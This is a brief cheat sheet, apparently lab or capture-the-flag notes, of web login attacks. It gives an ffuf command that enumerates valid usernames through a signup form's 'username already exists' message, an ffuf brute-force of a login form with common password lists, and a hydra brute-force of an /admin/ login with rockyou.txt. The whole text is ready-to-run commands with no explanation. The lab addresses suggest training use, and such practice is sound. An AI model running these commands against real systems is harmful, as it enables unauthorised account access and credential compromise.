
# enum existing users from signup page
```
ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://MACHINE_IP/customers/signup -mr "username already exists"
```

# brute force login
```
ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.17.103/customers/login -fc 200
```
```
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt $ip http-form-post '/admin/:username=^USER^&password=^PASS^:F=Incorrect Credentials' -V
```

